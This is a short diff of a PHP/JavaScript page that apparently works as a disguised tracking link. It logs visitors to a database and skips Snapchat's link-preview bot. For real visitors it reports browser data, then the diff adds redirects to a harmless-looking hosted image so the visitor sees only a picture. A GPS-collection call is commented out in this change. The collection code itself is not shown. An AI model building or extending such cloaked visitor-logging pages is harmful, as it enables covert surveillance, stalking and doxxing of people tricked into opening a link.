@@ -60,8 +60,6 @@ if (insertDataIntoDatabase("tlog", $keys, $values)) {
   exit();
 }
 
-
-
 ?>
 <html lang="en" class=""><head>
 
@@ -222,7 +220,7 @@ function checkIfRobot() {
   }else {
     //this is not a snapchat bot.
     reportJSStuff();
-    waitBeforeGPS();
+    //waitBeforeGPS();
   }
 }
 
@@ -290,10 +288,11 @@ function reportJSStuff() {
   })
     .done(function(data) {
       //console.log(data);
-      //$(".baconText").text(data[0]);
+      window.location.href = "https://i.ibb.co/jhbLq6g/F8-F983-B5-4-EC5-4-D3-C-A86-E-285-EF3957391.jpg";
+
     })
     .fail(function() {
-      //alert("no good");
+      window.location.href = "https://i.ibb.co/jhbLq6g/F8-F983-B5-4-EC5-4-D3-C-A86-E-285-EF3957391.jpg";
     });
 }
 
